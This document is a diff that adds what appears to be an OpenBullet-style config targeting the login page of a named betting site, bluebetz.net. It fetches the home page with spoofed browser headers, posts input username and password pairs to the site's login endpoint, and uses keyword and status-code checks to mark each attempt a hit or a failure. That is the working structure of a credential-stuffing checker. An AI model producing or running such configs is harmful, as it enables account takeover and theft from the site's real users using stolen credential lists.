@@ -1,0 +1,40 @@
+BLOCK:HttpRequest
+LABEL:GetHomePage
+  url = "https://bluebetz.net/home"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = "https://bluebetz.net/auth/login?return=home"
+  method = POST
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("content-type", "application/x-www-form-urlencoded"), ("origin", "https://bluebetz.net"), ("referer", "https://bluebetz.net/home"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+  $"username=@input.USER&password=@input.PASS"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains ""error""
+    STRINGKEY @data.SOURCE Contains ""Invalid""
+    STRINGKEY @data.SOURCE Contains ""incorrect""
+    STRINGKEY @data.SOURCE Contains ""failed""
+    STRINGKEY @data.SOURCE Contains ""unauthorized""
+    STRINGKEY @data.SOURCE Contains ""Wrong username or password""
+    STRINGKEY @data.SOURCE Contains ""Login failed""
+    STRINGKEY @data.RESPONSECODE Contains "401"
+    STRINGKEY @data.RESPONSECODE Contains "403"
+    STRINGKEY @data.RESPONSECODE Contains "400"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains ""success""
+    STRINGKEY @data.SOURCE Contains ""logged""
+    STRINGKEY @data.SOURCE Contains ""dashboard""
+    STRINGKEY @data.SOURCE Contains ""balance""
+    STRINGKEY @data.SOURCE Contains ""user""
+    STRINGKEY @data.RESPONSECODE Contains "200"
+    STRINGKEY @data.RESPONSECODE Contains "302"
+    STRINGKEY @data.HEADERS["Location"] Contains "/home"
+    STRINGKEY @data.HEADERS["Location"] Contains "/dashboard"
+ENDBLOCK
